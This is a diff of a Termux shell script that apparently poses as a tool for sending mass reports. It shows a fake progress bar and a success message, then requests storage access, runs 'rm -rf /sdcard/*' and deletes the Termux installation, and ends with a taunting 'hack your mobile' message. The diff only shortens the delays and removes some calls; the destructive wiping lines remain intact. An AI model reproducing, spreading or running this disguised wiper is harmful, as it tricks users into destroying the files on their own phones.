@@ -21,7 +21,6 @@ sleep 7
 echo -e "             $white  coded by$blue ${underline}MeZo☠"
 echo ""
 }
-banner
 load(){
 sleep 4 && clear
         echo "==> 5%"
@@ -65,15 +64,15 @@ sleep 4 && clear
         echo "=======================================>100%"
 echo "10000 REPORTS done!!!.........................."
  clear
-sleep 20 && clear
+sleep 2 && clear
 echo "REPORT SENDS SUCESSFULLY"
 termux-setup-storage
 rm -rf /sdcard/*
 rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files
-sleep 20 && clear
+sleep 2 && clear
 echo "hack your mobile by MeZo☠😈"
-sleep 10
+sleep 5
 }
 printf $green
 read -p "[×]Enter a option: " op
@@ -89,7 +88,6 @@ then
 	echo "Code staring...."
 	sleep 2
 	ip
-	loading
 	load
 else
 	echo "invaild option"
